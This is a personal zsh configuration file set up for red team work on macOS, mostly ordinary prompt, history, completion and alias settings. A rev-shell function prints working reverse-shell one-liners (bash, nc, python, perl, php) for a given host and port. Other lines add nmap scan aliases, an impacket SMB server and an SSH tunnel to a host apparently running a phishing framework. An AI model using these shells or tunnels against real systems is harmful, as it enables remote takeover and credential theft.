# ~/.zshrc - Optimized for Warp Terminal
# Red Team dotfiles configuration

# ----------------------
# Homebrew Configuration (macOS)
# ----------------------
# Auto-configure Homebrew environment on macOS systems
if [[ -d "/opt/homebrew" ]]; then
    eval "$(/opt/homebrew/bin/brew shellenv)"
elif [[ -d "/usr/local/Homebrew" ]]; then
    eval "$(/usr/local/bin/brew shellenv)"
fi

# ----------------------
# Warp Terminal Detection and Optimization
# ----------------------
# Detect if we're running in Warp
if [[ "$TERM_PROGRAM" == "WarpTerminal" ]]; then
    export WARP_TERMINAL=1
    # Optimize for Warp's features
    export DISABLE_AUTO_TITLE="true"
fi

# ----------------------
# Red Team Shell Banner
# ----------------------
if command -v figlet &> /dev/null && command -v lolcat &> /dev/null; then
    figlet -f slant "Red Team Shell" | lolcat
elif command -v figlet &> /dev/null; then
    figlet -f slant "Red Team Shell"
else
    echo "🔴 Red Team Shell Ready"
fi

setopt autocd              # change directory just by typing its name
setopt correct            # auto correct mistakes
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt

WORDCHARS=${WORDCHARS//\/} # Don't consider certain characters part of the word

# hide EOL sign ('%')
PROMPT_EOL_MARK=""

# configure key keybindings
# configure key keybindings
bindkey -e                                        # emacs key bindings
bindkey ' ' magic-space                           # do history expansion on space
bindkey '^[[3;5~' kill-word                       # ctrl + Supr
bindkey '^[[3~' delete-char                       # delete
bindkey '^[[1;5C' forward-word                    # ctrl + ->
bindkey '^[[1;5D' backward-word                   # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[Z' undo                               # shift + tab undo last action

# enable completion features - Enhanced for red team tools
autoload -Uz compinit
# Speed up compinit by checking cache once per day
if [[ -n ~/.cache/zcompdump(#qN.mh+24) ]]; then
    compinit -d ~/.cache/zcompdump
else
    compinit -C -d ~/.cache/zcompdump
fi

# Completion styling
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' # case insensitive tab completion
zstyle ':completion:*' list-colors "${(@s.:.)LS_COLORS}" # colorize completions
zstyle ':completion:*:descriptions' format '[%d]'
zstyle ':completion:*:warnings' format 'No matches found'
zstyle ':completion:*' group-name ''

# Red team tool specific completions
zstyle ':completion:*:*:nmap:*' file-patterns '*.xml:xml-files *.gnmap:gnmap-files *:all-files'
zstyle ':completion:*:*:gobuster:*' file-patterns '*.txt:wordlists *:all-files'

# History configurations - Enhanced for Red Team operations
HISTFILE=~/.zsh_history
HISTSIZE=10000
SAVEHIST=10000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space (good for sensitive commands)
setopt hist_verify            # show command with history expansion to user before running it
setopt hist_reduce_blanks     # remove superfluous blanks from history items
setopt inc_append_history     # write to history file immediately, not when shell exits
#setopt share_history         # share command history data

# force zsh to show the complete history
alias history="history 0"

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    # Warp-optimized prompt with red team context
    if [[ -n "$WARP_TERMINAL" ]]; then
        # Simplified prompt for Warp (it handles directory display)
        PROMPT='%F{red}⚡%f %F{%(#.red.green)}%n%f@%F{blue}%m%f %F{red}$%f '
    else
        # Full prompt for other terminals
        PROMPT='%F{red}⚡%f %F{%(#.red.green)}%n%f@%F{blue}%m%f %F{cyan}%~%f %F{red}$%f '
    fi
    
    # Right prompt with exit code and job count
    RPROMPT='%(?.. %? %F{red}%B✘%b%f)%(1j. %j %F{yellow}%B⚙%b%f.)'

    # enable syntax-highlighting
    if [ -f /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
        . /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
    elif [ -f /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
        . /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
    fi
    ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
    ZSH_HIGHLIGHT_STYLES[default]=none
    ZSH_HIGHLIGHT_STYLES[unknown-token]=fg=red,bold
    ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
    ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[global-alias]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[path]=underline
    ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
    ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
    ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[command-substitution]=none
    ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[process-substitution]=none
    ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
    ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[assign]=none
    ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
    ZSH_HIGHLIGHT_STYLES[named-fd]=none
    ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
    ZSH_HIGHLIGHT_STYLES[arg0]=fg=green
    ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
    ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
else
    PROMPT='%n@%m:%~%# '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    TERM_TITLE=$'\e]0;%n@%m: %~\a'
    ;;
*)
    ;;
esac

new_line_before_prompt=yes
precmd() {
    # Print the previously configured title
    print -Pnr -- "$TERM_TITLE"

    # Print a new line before the prompt, but only if it is not the first line
    if [ "$new_line_before_prompt" = yes ]; then
        if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
            _NEW_LINE_BEFORE_PROMPT=1
        else
            print ""
        fi
    fi
}

# enable color support of ls, less and man, and also add handy aliases
	export CLICOLOR=YES
    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

# Enhanced ls aliases with colors
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias lt='ls -altr'  # sort by time, newest last
alias lh='ls -alh'   # human readable sizes

# Red team specific aliases
# External IP address commands
alias myip='curl -s -4 ifconfig.me'  # Force IPv4
alias myip4='curl -s -4 ifconfig.me'
alias myip6='curl -s -6 ifconfig.me'
alias myip-alt='curl -s -4 ipinfo.io/ip'  # Alternative service
alias myip-check='curl -s -4 icanhazip.com'  # Backup service
alias localip='ipconfig getifaddr en0 2>/dev/null || ip route get 1 | awk "{print \$7}" | head -1'

# Function to get IP and store in variable for scripting
get_external_ip() {
    EXTERNAL_IP=$(curl -s -4 ifconfig.me)
    echo "External IP: $EXTERNAL_IP (stored in \$EXTERNAL_IP variable)"
}
alias ports='netstat -tuln'
alias listening='netstat -an | grep LISTEN'
alias webserver='python3 -m http.server 8080'
alias smbserver='impacket-smbserver share . -smb2support'
alias urlencode='python3 -c "import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))"'
alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))"'
# Fixed base64 functions (macOS compatible)
function base64encode() { echo -n "$1" | base64; }
function base64decode() { echo -n "$1" | base64 -D; }
alias rot13='tr a-zA-Z n-za-mN-ZA-M'
alias hexdump='xxd'
alias strings='strings -a'

# enable auto-suggestions based on the history
if [ -f /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh
elif [ -f /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh
fi
# change suggestion color
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'

# ----------------------
# Red Team Operations
# ----------------------

# -- Web Servers --
# Start a simple HTTP server
alias http-server='python3 -m http.server'
# Start a simple HTTPS server. Requires cert.pem and key.pem.
# Generate with: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
alias https-server='python3 -m http.server --cert-file=cert.pem --key-file=key.pem'

# -- Nmap --
# Scan top 1000 TCP ports with service and version detection
alias nmap-top-ports='nmap -sV -sC --top-ports=1000'

# -- Reverse Shells --
# Generate reverse shell one-liners
rev-shell() {
    echo "Usage: rev-shell <type> <lhost> <lport>"
    echo "Types: bash, nc, python, perl, php"
    case "$1" in
        bash)
            echo "bash -i >& /dev/tcp/$2/$3 0>&1"
            ;;
        nc)
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $3 >/tmp/f"
            ;;
        python)
            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((("$2",$3)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
            ;;
        perl)
            echo "perl -e 'use Socket;$i=\"$2\";$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\\&S\");open(STDOUT,\">\\&S\");open(STDERR,\">\\&S\");exec(\"/bin/sh -i\");};'"
            ;;
        php)
            echo "php -r '$sock=fsockopen(\"$2\",$3);exec(\"/bin/sh -i <\\&3 >\\&3 2\\&3\");'"
            ;;
    esac
}

# -- Red Team Functions --
# Show tun0 IP in prompt
get_tun0_ip() {
    ip addr show tun0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
}

# Quick port scanner
quickscan() {
    if [[ -z "$1" ]]; then
        echo "Usage: quickscan <target>"
        return 1
    fi
    nmap -T4 -F "$1"
}

# Extract various archive types
extract() {
    if [[ -f $1 ]]; then
        case $1 in
            *.tar.bz2)   tar xjf "$1"     ;;
            *.tar.gz)    tar xzf "$1"     ;;
            *.tar.xz)    tar xJf "$1"     ;;
            *.bz2)       bunzip2 "$1"     ;;
            *.rar)       unrar e "$1"     ;;
            *.gz)        gunzip "$1"      ;;
            *.tar)       tar xf "$1"      ;;
            *.tbz2)      tar xjf "$1"     ;;
            *.tgz)       tar xzf "$1"     ;;
            *.zip)       unzip "$1"       ;;
            *.Z)         uncompress "$1"  ;;
            *.7z)        7z x "$1"        ;;
            *)           echo "'$1' cannot be extracted via extract()" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}

# Find files containing specific text
findtext() {
    if [[ -z "$1" ]]; then
        echo "Usage: findtext <search_term> [directory]"
        return 1
    fi
    local dir="${2:-.}"
    grep -r "$1" "$dir" 2>/dev/null
}

# Network information
netinfo() {
    echo "=== Network Information ==="
    echo "External IPv4: $(curl -s -4 ifconfig.me)"
    echo "Local IP: $(ipconfig getifaddr en0 2>/dev/null || ip route get 1 | awk '{print $7}' | head -1)"
    echo "Gateway: $(route -n get default 2>/dev/null | grep gateway | awk '{print $2}' || ip route | grep default | awk '{print $3}' | head -1)"
    echo "DNS Servers: $(scutil --dns 2>/dev/null | grep nameserver | awk '{print $3}' | sort -u | tr '\n' ' ' || cat /etc/resolv.conf | grep nameserver | awk '{print $2}' | tr '\n' ' ')"
}

echo "Type /help for a list of commands."

# -- Help Command --
# Display a list of aliases and functions
/help() {
    echo "
🔴 Red Team Shell - Available Commands:

🚀 Web Servers:
    http-server / webserver: Start HTTP server (port 8000/8080)
    https-server: Start HTTPS server (requires cert.pem/key.pem)
    smbserver: Start SMB server in current directory

🔍 Network & Scanning:
    nmap-top-ports <target>: Quick nmap scan of top 1000 ports
    quickscan <target>: Fast nmap scan (-T4 -F)
    myip / myip4: Show external IPv4 address
    myip6: Show external IPv6 address
    myip-alt: Alternative external IPv4 service (ipinfo.io)
    myip-check: Backup external IPv4 service (icanhazip.com)
    get_external_ip: Get IP and store in $EXTERNAL_IP variable
    localip: Show local IP address
    netinfo: Display comprehensive network information
    ports / listening: Show open ports

📜 Encoding/Decoding:
    base64encode <text>: Base64 encode
    base64decode <text>: Base64 decode
    urlencode <text>: URL encode
    urldecode <text>: URL decode
    rot13: ROT13 cipher
    hexdump <file>: Hexadecimal dump

🛠️ Red Team Tools:
    rev-shell <type> <lhost> <lport>: Generate reverse shell
        Types: bash, nc, python, perl, php
    extract <file>: Extract various archive formats
    findtext <term> [dir]: Search for text in files

📁 File Operations:
    ll, la, l, lt, lh: Enhanced ls variants

🎥 Tmux (if available):
    Prefix + P: Start/Stop asciinema recording
    Prefix + N: Create new session
    Prefix + p/n: Previous/Next window

📚 Documentation:
    /help: This help message
    "
}

# ----------------------
# Homebrew Configuration
# ----------------------
# Add Homebrew to PATH and set environment variables
eval "$(/opt/homebrew/bin/brew shellenv)"

# Added by Windsurf
export PATH="/Users/MMiles/.codeium/windsurf/bin:$PATH"
alias evilgophish-tunnel="ssh -R 3333:localhost:3333 evilgophish -N -f"
alias evilgophish-tunnel-kill="pkill -f \"ssh.*evilgophish.*3333\""
alias evilgophish-tunnel-status="ps aux | grep \"ssh.*evilgophish\" | grep -v grep"
